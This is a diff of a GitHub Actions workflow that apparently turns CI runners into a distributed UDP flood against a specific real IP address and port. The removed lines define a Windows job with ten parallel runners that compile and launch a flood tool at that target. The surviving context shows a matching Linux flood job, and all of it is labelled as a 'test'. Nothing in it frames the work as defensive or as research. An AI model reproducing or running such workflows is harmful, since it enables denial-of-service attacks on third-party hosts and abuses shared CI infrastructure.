@@ -18,10 +18,7 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
         
-      - name: Setup C compiler (Linux)
-        run: |
-          sudo apt-get update
-          sudo apt-get install -y gcc make build-essential
+      
           
       - name: Compile UDP flood tool
         run: |
@@ -46,42 +43,4 @@ jobs:
           
           echo "✅ Linux UDP Flood Test ${{ matrix.vps }} completed"
 
-  windows-udp-flood:
-    runs-on: windows-latest
-    timeout-minutes: 120
-    strategy:
-      matrix:
-        vps: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]
-      max-parallel: 10
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
-          
-      - name: Setup C compiler (Windows)
-        run: |
-          choco install mingw -y
-          
-      - name: Compile UDP flood tool (Windows)
-        run: |
-          echo "🔨 Compiling UDP flood tool for Windows..."
-          gcc -o udpflood.exe udpflood.c -lpthread -lws2_32 -O3
-          echo "✅ Compiled udpflood.exe for Windows"
-          
-      - name: Test compilation
-        run: |
-          echo "Testing executable..."
-          .\udpflood.exe || echo "Executable test completed"
-          echo "✅ Binary works correctly"
-          
-      - name: Run UDP Flood Test (Windows)
-        run: |
-          echo "🪟 Starting Windows UDP Flood Test ${{ matrix.vps }}"
-          echo "Target: 23.176.168.11:80, Duration: 30s, Threads: 10, Packet Size: 1024"
-          
-          # Run UDP flood for 30 seconds with specified parameters
-          timeout 35 .\udpflood.exe 23.176.168.11 80 30 1000 0
-          
-          echo "✅ Windows UDP Flood Test ${{ matrix.vps }} completed"
-
   
-    
